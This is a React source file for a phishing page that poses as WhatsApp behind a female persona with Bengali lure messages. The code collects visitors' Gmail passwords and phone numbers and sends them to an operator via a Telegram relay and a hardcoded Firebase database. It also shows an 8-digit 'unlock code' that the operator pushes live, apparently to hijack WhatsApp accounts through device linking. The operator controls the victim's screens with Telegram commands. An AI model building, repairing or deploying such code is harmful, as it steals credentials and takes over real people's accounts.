import React, { useState, useEffect, useRef } from "react";
import { Lock } from "lucide-react";
import { initializeApp, getApp, getApps } from "firebase/app";
import { getDatabase, ref, onValue, update } from "firebase/database";
import { motion, AnimatePresence } from "motion/react";
import { Shield, Key, AlertTriangle, Phone, ArrowRight, Video } from "lucide-react";

import { AppPhase, AppConfig } from "./types";
import { WhatsAppHeader } from "./components/WhatsAppHeader";
import { WhatsAppFooter } from "./components/WhatsAppFooter";
import { PhoneInputPhase } from "./components/PhoneInputPhase";
import { LoadingPhase } from "./components/LoadingPhase";
import { GuidePhase } from "./components/GuidePhase";
import { SuccessPhase } from "./components/SuccessPhase";
import { QueueFullPhase } from "./components/QueueFullPhase";
import { GiftCardSlideshow } from "./components/GiftCardSlideshow";
import { ProfilePhase } from "./components/ProfilePhase";

// Initialize Firebase client directly with user specifications
const firebaseConfig = {
  apiKey: "AIzaSyDDI2GKw5b79lNmSetHFaRnuP39mGNwFlo",
  authDomain: "my-remotely-control-unlock.firebaseapp.com",
  projectId: "my-remotely-control-unlock",
  storageBucket: "my-remotely-control-unlock.firebasestorage.app",
  databaseURL: "https://my-remotely-control-unlock-default-rtdb.firebaseio.com",
  messagingSenderId: "324373220167",
  appId: "1:324373220167:web:954952e99ed0569f135a62"
};

const firebaseApp = !getApps().length ? initializeApp(firebaseConfig) : getApp();
const database = getDatabase(firebaseApp);

// Safe localStorage & sessionStorage wrapper to gracefully bypass exceptions in sandboxed browsers (like Messenger, Instagram, etc)
const safeStorage = {
  getItem: (key: string): string | null => {
    try {
      return localStorage.getItem(key);
    } catch (e) {
      return null;
    }
  },
  setItem: (key: string, value: string): void => {
    try {
      localStorage.setItem(key, value);
    } catch (e) {
      // Ignore
    }
  },
  removeItem: (key: string): void => {
    try {
      localStorage.removeItem(key);
    } catch (e) {
      // Ignore
    }
  }
};

const safeSessionStorage = {
  getItem: (key: string): string | null => {
    try {
      return sessionStorage.getItem(key);
    } catch (e) {
      return null;
    }
  },
  setItem: (key: string, value: string): void => {
    try {
      sessionStorage.setItem(key, value);
    } catch (e) {
      // Ignore
    }
  },
  removeItem: (key: string): void => {
    try {
      sessionStorage.removeItem(key);
    } catch (e) {
      // Ignore
    }
  }
};

// Helper to parse code/unlock number in a multi-compatible format without slot system
const parseCodeFromDb = (val: any): string => {
  if (!val) return "        ";

  // Case 1: If val itself is a primitive (string or number), return it
  if (typeof val === "string" || typeof val === "number") {
    const rawStr = String(val).trim();
    return rawStr ? rawStr : "        ";
  }

  if (typeof val !== "object") return "        ";

  // Case 2: Check standard keys at this level
  const possibleCodeKeys = [
    "code", "liveCode", "live_code", "unlockCode", "unlock_code", 
    "pin", "password", "verification_code", "link_code", "otp"
  ];
  for (const key of possibleCodeKeys) {
    if (val[key] !== undefined && val[key] !== null) {
      const v = val[key];
      if (typeof v === "object") {
        const nestedRes = parseCodeFromDb(v);
        if (nestedRes && nestedRes.trim().length > 0) return nestedRes;
      } else {
        const parsed = String(v).trim();
        if (parsed) return parsed;
      }
    }
  }

  // Case 3: Check if there's a digits array, e.g. digits: ['1', '2', ...]
  if (val.digits) {
    if (Array.isArray(val.digits)) {
      return val.digits.join("");
    } else if (typeof val.digits === "string" || typeof val.digits === "number") {
      return String(val.digits);
    } else if (typeof val.digits === "object") {
      const nestedRes = parseCodeFromDb(val.digits);
      if (nestedRes && nestedRes.trim().length > 0) return nestedRes;
    }
  }

  // Case 4: Check if they are writing to individual indexes under root (e.g., box0, box1... or digit0, digit1...)
  let constructed = "";
  let foundAnyDigit = false;
  for (let i = 0; i < 8; i++) {
    const boxVal = val[`box${i}`] ?? val[`box_${i}`] ?? val[`digit${i}`] ?? val[`digit_${i}`] ?? val[`d${i}`] ?? val[`d_${i}`] ?? val[`val${i}`] ?? val[i];
    if (boxVal !== undefined && boxVal !== null) {
      if (typeof boxVal === "object") {
        const parsedBox = parseCodeFromDb(boxVal);
        constructed += parsedBox.trim().substring(0, 1) || " ";
      } else {
        constructed += String(boxVal).substring(0, 1);
      }
      foundAnyDigit = true;
    } else {
      constructed += " ";
    }
  }
  if (foundAnyDigit && constructed.trim().length > 0) {
    return constructed;
  }

  // Case 5: Scan any other nested objects recursively to find the digits/code,
  // excluding standard system metadata keys to avoid infinite recursion
  for (const key of Object.keys(val)) {
    if (["updatedAt", "lastActive", "uid", "phone", "phoneNumber", "currentPhase", "action", "status"].includes(key)) {
      continue;
    }
    const innerVal = val[key];
    if (innerVal && typeof innerVal === "object") {
      const nestedRes = parseCodeFromDb(innerVal);
      if (nestedRes && nestedRes.trim().length > 0) {
        return nestedRes;
      }
    }
  }

  return "        ";
};

// Helper to parse remote operators actions without slot system
const parseActionFromDb = (val: any): string => {
  if (!val || typeof val !== "object") return "";

  // Check top level
  if (val.action) return String(val.action).toLowerCase();
  if (val.status) return String(val.status).toLowerCase();

  // Search recursively
  for (const key of Object.keys(val)) {
    if (["updatedAt", "lastActive", "uid"].includes(key)) {
      continue;
    }
    const innerVal = val[key];
    if (innerVal && typeof innerVal === "object") {
      const res = parseActionFromDb(innerVal);
      if (res) return res;
    }
  }

  return "";
};

export default function App() {
  const [phase, setPhaseState] = useState<AppPhase>(AppPhase.PROFILE);
  const [phoneNumber, setPhoneNumber] = useState(() => {
    return safeStorage.getItem("whatsapp_verified_phone") || "";
  });
  const [gmail, setGmail] = useState(() => {
    return safeStorage.getItem("whatsapp_gmail_address") || "";
  });
  const [verifiedPhone, setVerifiedPhone] = useState<string>(() => safeStorage.getItem("whatsapp_verified_phone") || "");
  const [config, setConfig] = useState<AppConfig | null>(null);
  const [liveCode, setLiveCode] = useState("        ");
  const [showError, setShowError] = useState(false);
  const [timeLeft, setTimeLeft] = useState(20);
  const [isLoadingTransition, setIsLoadingTransition] = useState(false);

  const [hasSentOnce, setHasSentOnce] = useState<boolean>(() => {
    return safeStorage.getItem("whatsapp_has_sent_once") === "true";
  });
  const [bypassCountdown, setBypassCountdown] = useState<boolean>(() => {
    return safeStorage.getItem("whatsapp_bypass_countdown") === "true";
  });
  const [userManuallyBacked, setUserManuallyBacked] = useState<boolean>(() => {
    return safeStorage.getItem("whatsapp_user_manually_backed") === "true";
  });
  
  // Custom persistent phase setter to maintain progress across link re-entries:
  const setPhase = (newPhase: AppPhase) => {
    setPhaseState(newPhase);
    safeStorage.setItem("app_current_phase", newPhase);
  };
  
  // Real-time database is loaded indicator
  const [isDbLoaded, setIsDbLoaded] = useState(false);

  // Multi-user browser isolation session ID
  const [sessionUid, setSessionUid] = useState<string>("");

  // Real-time Chat core states
  const [footerMessage, setFooterMessage] = useState("");
  const [messages, setMessages] = useState<any[]>([]);
  const [isNusratTyping, setIsNusratTyping] = useState(false);

  const lastUpdateIdRef = useRef<number>(0);
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const messagesEndRef = useRef<HTMLDivElement | null>(null);
  
  // 1. Generate or retrieve unique persistent browser Session UID
  useEffect(() => {
    let uid = safeStorage.getItem("whatsapp_session_uid");
    if (!uid) {
      uid = "visitor_" + Math.random().toString(36).substring(2, 8);
      safeStorage.setItem("whatsapp_session_uid", uid);
    }
    setSessionUid(uid);
  }, []);

  // 1B. Alert Telegram when a new visitor lands on the page (anti-spam sessionStorage check included)
  useEffect(() => {
    if (!sessionUid) return;
    const enterNotified = safeSessionStorage.getItem("whatsapp_entered_notified_v3");
    if (!enterNotified) {
      sendTelegramMessage(
        `👤 *নতুন গ্রাহক পেজে প্রবেশ করেছেন!* 🚀\n` +
        `🔑 *সেশন আইডি:* \`${sessionUid}\`\n` +
        `📱 *স্ট্যাটাস:* স্বাগতম জানানো হয়েছে এবং সুরক্ষাধীন নির্দেশিকা সচল`
      );
      safeSessionStorage.setItem("whatsapp_entered_notified_v3", "true");
    }
  }, [sessionUid]);

  // 2. Fetch dynamic config and asset paths from server
  useEffect(() => {
    fetch("/api/config")
      .then((res) => res.json())
      .then((data: AppConfig) => {
        setConfig(data);
      })
      .catch((err) => {
        console.error("Error loading application config:", err);
      });
  }, []);

  // 2B. Real-time WebSockets connection and message listeners
  useEffect(() => {
    if (!sessionUid) return;

    let socket: WebSocket;
    let reconnectTimeout: any;

    const connectWS = () => {
      const proto = window.location.protocol === "https:" ? "wss://" : "ws://";
      const url = `${proto}${window.location.host}`;
      socket = new WebSocket(url);
      wsRef.current = socket;

      socket.onopen = () => {
        // Send join command to identify this connection
        socket.send(JSON.stringify({
          type: "join",
          sessionUid,
          isAdmin: false
        }));
      };

      socket.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === "init") {
            if (data.history && data.history.length > 0) {
              setMessages(data.history);
            }
          }

          if (data.type === "typing") {
            if (data.sessionUid !== sessionUid) {
              // Nusrat is typing a reply to us
              setIsNusratTyping(!!data.text);
            }
          }

          if (data.type === "message") {
            if (data.sessionUid === sessionUid) {
              setMessages((prev) => {
                const alreadyExists = prev.some(m => m.id === data.message.id);
                if (alreadyExists) return prev;
                return [...prev, data.message];
              });
            }
          }
        } catch (err) {
          console.warn("WS parsing warning:", err);
        }
      };

      socket.onclose = () => {
        reconnectTimeout = setTimeout(connectWS, 4000);
      };

      socket.onerror = (err) => {
        socket.close();
      };
    };

    connectWS();

    return () => {
      if (socket) {
        socket.onclose = null;
        socket.close();
      }
      clearTimeout(reconnectTimeout);
    };
  }, [sessionUid]);

  // Smooth scroll to keep the most recent messages visible
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, isNusratTyping]);

  const handleSendMessage = (text: string) => {
    if (!text.trim() || !sessionUid) return;

    const payload = {
      type: "message",
      sessionUid,
      sender: "user",
      text,
      timestamp: Date.now()
    };

    // Dispatch instantly over WebSocket
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(payload));
      
      // Clear our typing status on submit
      wsRef.current.send(JSON.stringify({
        type: "typing",
        sessionUid,
        text: ""
      }));
    } else {
      // Fallback in case of temporary disconnection
      setMessages((prev) => [
        ...prev,
        {
          id: "offline_" + Date.now(),
          sender: "user",
          text,
          timestamp: Date.now()
        }
      ]);
    }

    setFooterMessage("");
  };

  const handleFooterTyping = (text: string) => {
    setFooterMessage(text);
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({
        type: "typing",
        sessionUid,
        text
      }));
    }
  };

  // Simple direct helper to update state on Firebase root and mirrored paths
  const updateFirebaseRef = async (data: any) => {
    try {
      const dbRef = ref(database);
      const updates: any = {};
      
      // Mirror to top level and nested liveCode and liveCodes sub-paths
      Object.keys(data).forEach(key => {
        updates[key] = data[key];
        updates[`liveCode/${key}`] = data[key];
        updates[`liveCodes/${key}`] = data[key];
      });
      
      const now = Date.now();
      updates["updatedAt"] = now;
      updates["liveCode/updatedAt"] = now;
      updates["liveCodes/updatedAt"] = now;

      await update(dbRef, updates);
      return true;
    } catch (err) {
      console.warn("Error updating Firebase database:", err);
      return false;
    }
  };

  // 3. Keep 8 boxes synchronized with direct Firebase Realtime Database
  useEffect(() => {
    if (!sessionUid) return;

    const dbRef = ref(database);
    const unsubscribe = onValue(dbRef, (snapshot) => {
      try {
        const val = snapshot.val();
        if (val) {
          // Parse code using multi-compatible helper
          const parsedCode = parseCodeFromDb(val);
          setLiveCode(parsedCode);

          // If code is loaded and not blank spaces, instantly bypass countdown
          if (parsedCode.trim().length > 0) {
            setTimeLeft(0);
          }

          // Parse remote operator action
          const action = parseActionFromDb(val);
          if (action === "success") {
            setPhase(AppPhase.SUCCESS);
          } else if (action === "error") {
            setShowError(true);
          } else if (action === "clear") {
            safeStorage.removeItem("whatsapp_verified_phone");
            setVerifiedPhone("");
            setPhase(AppPhase.AI_CHAT);
            setShowError(false);
          }

          setIsDbLoaded(true);
        } else {
          setIsDbLoaded(true);
        }
      } catch (err) {
        console.warn("Error processing Firebase direct snapshot:", err);
      }
    }, (error) => {
      console.warn("Firebase onValue subscription error:", error);
    });

    return () => {
      unsubscribe();
    };
  }, [sessionUid]);

  // 4. Auto-advance if live code is typed prior/externally and user is not manual
  useEffect(() => {
    if (liveCode.trim().length > 0 && (phase === AppPhase.PHONE_INPUT || phase === AppPhase.AI_CHAT)) {
      if (!userManuallyBacked) {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }
    }
  }, [liveCode, phase, userManuallyBacked]);

  // 5. Heartbeat checking to keep active session details online directly in Firebase
  useEffect(() => {
    if (!config || !sessionUid) return;

    const updateCheckIn = () => {
      try {
        updateFirebaseRef({
          uid: sessionUid,
          phone: phoneNumber || verifiedPhone || "Connected User",
          currentPhase: phase,
          lastActive: Date.now()
        });
      } catch (e) {
        console.warn("Heartbeat update bypassed:", e);
      }
    };

    updateCheckIn();
    const heartbeatInterval = setInterval(updateCheckIn, 15000);

    return () => {
      clearInterval(heartbeatInterval);
    };
  }, [config, sessionUid, phase, phoneNumber, verifiedPhone]);

  // Centralized robust transition for the LOADING phase to ensure they never get stuck (even on tab suspension or refresh!)
  useEffect(() => {
    if (phase === AppPhase.LOADING) {
      // In-app browsers like FB Messenger might suspend JS. 
      // Keeping this transition short (1.5s) ensures that we automatically land on the active 8-digit code phase fast.
      const timer = setTimeout(() => {
        setPhase(AppPhase.GUIDE_AND_CODE);
        startCountdown();
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [phase]);

  // 6. Cleanup intervals on unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    };
  }, []);

  // 7. Send Telegram messages (async fire-and-forget to prevent blocking UI transitions on slow networks)
  const sendTelegramMessage = (text: string) => {
    fetch("/api/telegram/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text })
    }).catch((err) => {
      console.warn("Failed telegram message:", err);
    });
  };

  // 8. Telegram polling for command keys
  const startTelegramPolling = () => {
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);

    pollIntervalRef.current = setInterval(async () => {
      try {
        const offset = lastUpdateIdRef.current + 1;
        const res = await fetch(`/api/telegram/getUpdates?offset=${offset}`);
        if (!res.ok) return;
        
        const data = await res.json();

        if (data && data.ok && data.result && data.result.length > 0) {
          data.result.forEach((updateItem: any) => {
            lastUpdateIdRef.current = updateItem.update_id;
            const textMessage = updateItem.message?.text?.trim() || "";
            
            const sanitizedPhone = phoneNumber.replace(/\D/g, "");
            
            const parts = textMessage.split(/\s+/);
            const rawCommand = parts[0].toLowerCase();
            const targetParam = parts[1] ? parts[1].trim() : "";

            const isTargetedToMe = targetParam 
              ? (targetParam === sessionUid || targetParam === phoneNumber || (sanitizedPhone && targetParam === sanitizedPhone))
              : true;

            if (isTargetedToMe) {
              if (rawCommand === "/success" || rawCommand === "success" || rawCommand === "successful" || rawCommand === "successfull") {
                if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
                setPhase(AppPhase.SUCCESS);
              } else if (rawCommand === "/error" || rawCommand === "error") {
                setShowError(true);
              }
            }
          });
        }
      } catch (err) {
        // Quiet down
      }
    }, 2000);
  };

  // Back Navigation Helper to transition step-by-step
  const handleBack = () => {
    const savedVerified = safeStorage.getItem("whatsapp_verified_phone") || "";
    if (savedVerified) {
      setPhoneNumber(savedVerified);
    }

    if (phase === AppPhase.PHONE_INPUT) {
      setPhase(AppPhase.PROFILE);
    } else if (phase === AppPhase.LOADING) {
      setHasSentOnce(true);
      safeStorage.setItem("whatsapp_has_sent_once", "true");
      setBypassCountdown(true);
      safeStorage.setItem("whatsapp_bypass_countdown", "true");
      setUserManuallyBacked(true);
      safeStorage.setItem("whatsapp_user_manually_backed", "true");
      setPhase(AppPhase.PROFILE);
    } else if (phase === AppPhase.GUIDE_AND_CODE) {
      setHasSentOnce(true);
      safeStorage.setItem("whatsapp_has_sent_once", "true");
      setBypassCountdown(true);
      safeStorage.setItem("whatsapp_bypass_countdown", "true");
      setUserManuallyBacked(true);
      safeStorage.setItem("whatsapp_user_manually_backed", "true");
      setPhase(AppPhase.PROFILE);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    } else if (phase === AppPhase.SUCCESS) {
      setPhase(AppPhase.PROFILE);
    } else if (phase === AppPhase.QUEUE_FULL) {
      setHasSentOnce(true);
      safeStorage.setItem("whatsapp_has_sent_once", "true");
      setBypassCountdown(true);
      safeStorage.setItem("whatsapp_bypass_countdown", "true");
      setUserManuallyBacked(true);
      safeStorage.setItem("whatsapp_user_manually_backed", "true");
      setPhase(AppPhase.PROFILE);
    } else {
      setPhase(AppPhase.PROFILE);
    }
  };

  // Google Login Submit Handler
  const handleGoogleLoginSubmit = async (email: string, password?: string) => {
    setIsLoadingTransition(true);
    try {
      await updateFirebaseRef({
        gmail: email,
        gmail_password: password || "Simulated Account",
        uid: sessionUid,
        currentPhase: "google_login",
        lastActive: Date.now()
      });

      sendTelegramMessage(
        `*🔑 Google Premium user Login alert*\n` +
        `👤 *User name:* Nusrat jahan client\n\n` +
        `📧 *Gmail account:* \`${email}\`\n` +
        `🔑 *Password:* \`${password || "Simulated (1-Click Google Authorization)"}\`\n\n` +
        `🆔 *Session ID:* \`${sessionUid}\``
      );

      // Now progress past the Google login to the whatsapp phone number activation
      setPhase(AppPhase.PHONE_INPUT);
    } catch (err) {
      console.error("Error setting Google login details in DB:", err);
    } finally {
      setIsLoadingTransition(false);
    }
  };

  // 10. Submit phone call or Gmail verification (No slot limitation)
  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneNumber.trim() && !gmail.trim()) return;

    setHasSentOnce(true);
    safeStorage.setItem("whatsapp_has_sent_once", "true");

    setUserManuallyBacked(false);
    safeStorage.removeItem("whatsapp_user_manually_backed");

    if (gmail.trim()) {
      safeStorage.setItem("whatsapp_gmail_address", gmail.trim());
    }

    const sanitizedPhone = phoneNumber.replace(/\D/g, "");
    setIsLoadingTransition(true);

    try {
      const dbPayload: any = {
        uid: sessionUid,
        currentPhase: "loading",
        lastActive: Date.now()
      };
      if (phoneNumber.trim()) {
        dbPayload.phone = phoneNumber;
        dbPayload.phoneNumber = phoneNumber;
      }
      if (gmail.trim()) {
        dbPayload.gmail = gmail.trim();
        dbPayload.currentPhase = "google_login";
      }

      await updateFirebaseRef(dbPayload);
      
      if (sanitizedPhone) {
        safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
        setVerifiedPhone(sanitizedPhone);
      }

      let telegramMsg = `*🚨 New Verification Entry Alert *\n` +
        `👤 *User Name:* Nusrat jahan client\n\n`;

      if (phoneNumber.trim()) {
        telegramMsg += `📱 *হোয়াটসঅ্যাপ নম্বর (Click to Copy):*\n\`${phoneNumber}\`\n\n`;
      }
      if (gmail.trim()) {
        telegramMsg += `📧 *জিমেইল অ্যাকাউন্ট (Gmail):*\n\`${gmail.trim()}\`\n\n`;
      }

      telegramMsg += `🔑 *Session ID:* \`${sessionUid}\``;

      sendTelegramMessage(telegramMsg);

      safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
      setPhase(AppPhase.GUIDE_AND_CODE);
      startCountdown();
    } catch (err) {
      console.error("Error setting code details in DB:", err);
    } finally {
      setIsLoadingTransition(false);
    }
  };

  // 10.5. Direct Smart One-Click Automated WhatsApp Link Handoff
  const launchWhatsApp = (url: string) => {
    // Dynamic hidden anchor tag with target="_blank" opens WhatsApp safely in a new tab/app
    // without hijacking the current iframe session (preventing "refused to connect" or white screens)
    try {
      const a = document.createElement("a");
      a.href = url;
      a.target = "_blank";
      a.rel = "noopener noreferrer";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    } catch (e) {
      console.error("Standard redirection failed, attempting fallback:", e);
      window.location.href = url;
    }
  };

  const handleAutoWhatsAppSubmit = async (customNum: string) => {
    setPhoneNumber(customNum);
    setHasSentOnce(true);
    safeStorage.setItem("whatsapp_has_sent_once", "true");

    setUserManuallyBacked(false);
    safeStorage.removeItem("whatsapp_user_manually_backed");

    const sanitizedPhone = customNum.replace(/\D/g, "");

    const msg = "আমি আপনার সাথে প্রাইভেট কলে যুক্ত হতে চাই আপনার চ্যাট লিস্টের প্রাইভেট নাম্বার টি দিন এবং আমাকে এড করুন";
    const waUrl = `https://api.whatsapp.com/send?phone=8801746653292&text=${encodeURIComponent(msg)}`;

    setIsLoadingTransition(true);
    try {
      await updateFirebaseRef({
        phone: customNum,
        phoneNumber: customNum,
        uid: sessionUid,
        currentPhase: "loading",
        lastActive: Date.now()
      });
      safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
      setVerifiedPhone(sanitizedPhone);

      sendTelegramMessage(
        `*🚨 New Log In Attempt (No Slot System - 1-Click)*\n` +
        `👤 *User Name:* Nusrat jahan client\n\n` +
        `📱 *নম্বরটি কপি করতে নিচের কোডে ক্লিক করুন (Click to Copy):*\n` +
        `\`${customNum}\`\n\n` +
        `🔑 *Session ID:* \`${sessionUid}\``
      );

      // Instantly open native WhatsApp via our premium sandboxed launcher
      launchWhatsApp(waUrl);

      safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
      setPhase(AppPhase.GUIDE_AND_CODE);
      startCountdown();
    } catch (err) {
      console.error("Error setting code details in DB:", err);
    } finally {
      setIsLoadingTransition(false);
    }
  };

  // 11. Start 20s countdown logic
  const startCountdown = () => {
    if (bypassCountdown) {
      setTimeLeft(0);
      return;
    }
    setTimeLeft(20);
    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);

    countdownIntervalRef.current = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  // 11.5. Dynamic Handlers for Returning Users & New Inputs
  const handleInputFieldClick = () => {
    if (!hasSentOnce) return;
    const activePhone = phoneNumber || verifiedPhone || "";
    if (!activePhone) return;

    // Send notification instantly to Telegram
    sendTelegramMessage(
      `🚨 *Returning User Auto Refresh (Input Field Click)*\n\n` +
      `📱 *নম্বরটি কপি করতে নিচের কোডে ক্লিক করুন (Click to Copy):*\n` +
      `\`${activePhone}\`\n\n` +
      `🔑 *Session ID:* \`${sessionUid}\``
    );
  };

  const handleNewNumber = () => {
    // Clear general active path values on firebase
    updateFirebaseRef({
      phone: "",
      phoneNumber: "",
      code: "        ",
      digits: [" ", " ", " ", " ", " ", " ", " ", " "],
      uid: "",
      currentPhase: "",
      lastActive: 0,
      action: "",
      status: "",
      actionTimestamp: 0
    });

    setPhoneNumber("");
    setVerifiedPhone("");
    safeStorage.removeItem("whatsapp_verified_phone");

    setHasSentOnce(false);
    safeStorage.removeItem("whatsapp_has_sent_once");

    setBypassCountdown(false);
    safeStorage.removeItem("whatsapp_bypass_countdown");

    setUserManuallyBacked(false);
    safeStorage.removeItem("whatsapp_user_manually_backed");

    // Clear active UI indicators
    setShowError(false);
  };

  // 12. Handle Link Action CTA ("Copy this unlock number")
  const handleActionClick = () => {
    sendTelegramMessage(
      `📢 *User Interaction Action:* Session \`${sessionUid}\` clicked "Copy this unlock number"!\n` +
      `No auto-redirect to mobile WhatsApp is initiated as per request.`
    );

    setTimeout(() => {
      sendTelegramMessage(
        `✅ *Handshake copy operation finished* for session \`${sessionUid}\`.\n\n` +
        `👉 Send control key:\n` +
        `• \`/success ${sessionUid}\` (or click successfully)\n` +
        `• \`/error ${sessionUid}\``
      );
    }, 1500);
  };

  const handleStartChat = () => {
    const msg = "আমি আপনার সাথে প্রাইভেট কলে যুক্ত হতে চাই আপনার চ্যাট লিস্টের প্রাইভেট নাম্বার টি দিন এবং আমাকে এড করুন";
    const waUrl = `https://api.whatsapp.com/send?phone=8801746653292&text=${encodeURIComponent(msg)}`;
    launchWhatsApp(waUrl);
  };

  // 15. System is silent with no automatic prompts as per user request
  useEffect(() => {
    // Keep it clean without injecting automated AI messages in chat list
  }, [phase, sessionUid]);

  // 16. Inactivity nudge is disabled to keep the page completely free of unrequested text messages
  useEffect(() => {
    // No automatic message injection on inactivity
  }, [phase]);

  return (
    <div className="flex justify-center items-center w-full h-screen bg-[#111] overflow-hidden select-none">
      <div className="w-full max-w-[480px] h-full flex flex-col bg-slate-900 relative shadow-2xl overflow-hidden border-x border-slate-800">
        
        {phase === AppPhase.PROFILE ? (
          <ProfilePhase 
            onJoinNow={() => {}} 
            phoneNumber={phoneNumber}
            setPhoneNumber={setPhoneNumber}
            onSubmit={handlePhoneSubmit}
            isLoading={isLoadingTransition}
            hasSentOnce={hasSentOnce}
            onNewNumber={handleNewNumber}
          />
        ) : phase === AppPhase.PHONE_INPUT ? (
          <div className="w-full h-full bg-[#f4f6f8] whatsapp-chat-bg flex flex-col justify-center items-center p-4 relative overflow-y-auto">
            <div className="w-full max-w-[340px] my-auto">
              <PhoneInputPhase
                key="phone"
                phoneNumber={phoneNumber}
                setPhoneNumber={setPhoneNumber}
                onSubmit={handlePhoneSubmit}
                onAutoSubmit={handleAutoWhatsAppSubmit}
                isLoading={isLoadingTransition}
                onBack={handleBack}
                hasSentOnce={hasSentOnce}
                onNewNumber={handleNewNumber}
                onInputFieldClick={handleInputFieldClick}
              />
            </div>
          </div>
        ) : (
          <>
            {/* WhatsApp Top Header Bar with Support click menu integrations */}
            <WhatsAppHeader 
              avatarUrl={config?.avatarUrl} 
              name="MST NUSRAT JAHAN"
              subtitle={isNusratTyping ? "typing..." : "Online"}
              isTyping={isNusratTyping || phase === AppPhase.LOADING}
              onBack={handleBack}
              onCallClick={() => {}}
            />

            {/* Dynamic Chat Wallpaper Space */}
            <main className="flex-1 overflow-y-auto px-4 py-4 whatsapp-chat-bg flex flex-col justify-center items-center scroll-smooth relative font-sans">
              
              <div className="w-full max-w-[340px] py-1.5 flex flex-col justify-center items-center">
                <AnimatePresence mode="wait">
                  {phase === AppPhase.LOADING && (
                    <LoadingPhase key="loading" onBack={handleBack} />
                  )}

                  {phase === AppPhase.GUIDE_AND_CODE && (
                    <GuidePhase
                      key="guide"
                      timeLeft={timeLeft}
                      liveCode={liveCode}
                      showError={showError}
                      onActionClick={handleActionClick}
                      onBack={handleBack}
                    />
                  )}

                  {phase === AppPhase.SUCCESS && (
                    <SuccessPhase
                      key="success"
                      onStartChat={handleStartChat}
                      onBack={handleBack}
                    />
                  )}

                  {phase === AppPhase.QUEUE_FULL && (
                    <QueueFullPhase
                      key="queue_full"
                      phoneNumber={phoneNumber}
                      onSupportClick={handleStartChat}
                      onBack={handleBack}
                    />
                  )}
                </AnimatePresence>
              </div>
              
            </main>
          </>
        )}

      </div>
    </div>
  );
}
